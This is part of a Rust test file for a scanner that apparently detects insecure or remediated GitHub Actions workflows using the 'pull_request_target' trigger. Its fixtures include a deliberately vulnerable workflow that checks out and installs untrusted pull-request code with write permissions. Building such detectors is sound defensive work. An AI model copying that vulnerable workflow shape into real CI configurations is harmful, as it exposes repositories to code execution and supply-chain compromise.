        assert!(REMOVED_PR_MERGE_REF_CHECKOUT_RE.is_match(&removed));
        assert!(REMOVED_UNTRUSTED_CODE_EXECUTION_RE.is_match(&removed));
        assert!(has_pull_request_target_cache_poisoning_remediation_context(
            patch, added, &removed
        ));
    }

    #[test]
    fn detects_documented_pull_request_target_trigger_replacement_remediation() {
        let patch = r#"
@@ -4,7 +4,7 @@ on:
   # We use `pull_request_target` to split trust boundaries across jobs:
   # - `benchmark-pr` checks out PR merge code and runs it as untrusted with read-only permissions.
   # - `comment-pr` runs trusted base-repo code with limited write access to upsert the PR comment.
-  pull_request_target:
+  pull_request:
     paths:
       - 'packages/**'
"#;
        let added = patch
            .lines()
            .filter(|line| line.starts_with('+'))
            .collect::<Vec<_>>()
            .join("\n");
        let removed = patch
            .lines()
            .filter(|line| line.starts_with('-'))
            .collect::<Vec<_>>()
            .join("\n");

        assert!(REMOVED_PR_TARGET_RE.is_match(&removed));
        assert!(has_pull_request_target_cache_poisoning_remediation_context(
            patch, &added, &removed
        ));
    }

    #[test]
    fn ignores_broad_pull_request_target_removal_without_cache_poisoning_context() {
        let patch = r#"
-  pull_request_target:
+  pull_request:
-      - run: npm test
-      - uses: actions/checkout@v4
"#;
        let added = patch
            .lines()
            .filter(|line| line.starts_with('+'))
            .collect::<Vec<_>>()
            .join("\n");
        let removed = patch
            .lines()
            .filter(|line| line.starts_with('-'))
            .collect::<Vec<_>>()
            .join("\n");

        assert!(REMOVED_PR_TARGET_RE.is_match(&removed));
        assert!(
            !has_pull_request_target_cache_poisoning_remediation_context(patch, &added, &removed)
        );
    }

    #[test]
    fn recognizes_mitigated_pull_request_target_split_job_shape() {
        let added = r#"
+on:
+  pull_request_target:
+permissions: {}
+jobs:
+  resolve-env:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          if [[ "${{ github.event.pull_request.head.repo.full_name }}" == "${{ github.repository }}" ]]; then
+            echo "environment=trusted" >> "$GITHUB_OUTPUT"
+          else
+            echo "environment=external contributors" >> "$GITHUB_OUTPUT"
+          fi
+  build:
+    needs: resolve-env
+    environment: ${{ needs.resolve-env.outputs.environment }}
+    permissions: {}
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: pnpm install --frozen-lockfile
+      - run: pnpm build
+      - uses: actions/upload-artifact@v4
+        with:
+          name: output
+  sanitize:
+    needs: build
+    permissions: {}
+    steps:
+      - uses: actions/download-artifact@v7
+      - name: Sanitize output
+        run: |
+          ALLOWED_PACKAGES=svelte
+          SHA_PATTERN='^[0-9a-f]{7}$'
+          echo sanitized-output
+  comment:
+    needs: sanitize
+    permissions:
+      pull-requests: write
"#;
        assert!(PR_HEAD_CHECKOUT_RE.is_match(added));
        assert!(UNTRUSTED_CODE_EXECUTION_RE.is_match(added));
        assert!(has_pull_request_target_untrusted_code_mitigation(added));
    }

    #[test]
    fn does_not_mitigate_plain_pull_request_target_untrusted_execution() {
        let added = r#"
+on:
+  pull_request_target:
+permissions:
+  contents: write
+jobs:
+  test:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm install
"#;
        assert!(!has_pull_request_target_untrusted_code_mitigation(added));
    }
}
